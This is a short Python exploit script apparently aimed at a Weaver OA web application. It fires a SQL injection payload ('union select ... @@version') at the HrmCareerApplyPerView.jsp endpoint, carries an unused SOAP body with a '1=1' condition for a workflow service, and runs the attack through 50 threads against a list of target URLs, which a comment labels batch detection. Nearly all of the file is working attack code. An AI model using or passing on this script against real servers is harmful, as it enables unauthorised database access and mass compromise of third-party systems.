import requests
import warnings
warnings.filterwarnings("ignore")

def exp(u):
    url = f"{u}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,@@version,2,5,6,7"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "text/xml",
        "Accept-Encoding": "gzip"
    }

    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080',
    }
    data=('''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
  <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1</web:string>
        </web:in4>
      </web:getHendledWorkflowRequestList>
  </soapenv:Body>
</soapenv:Envelope>
          ''')
    try:
        response = requests.get(url, timeout=3,headers=headers,proxies= proxies,allow_redirects=False)
    except:
        pass


from concurrent.futures import ThreadPoolExecutor
# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()][200:]
with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(exp, urls)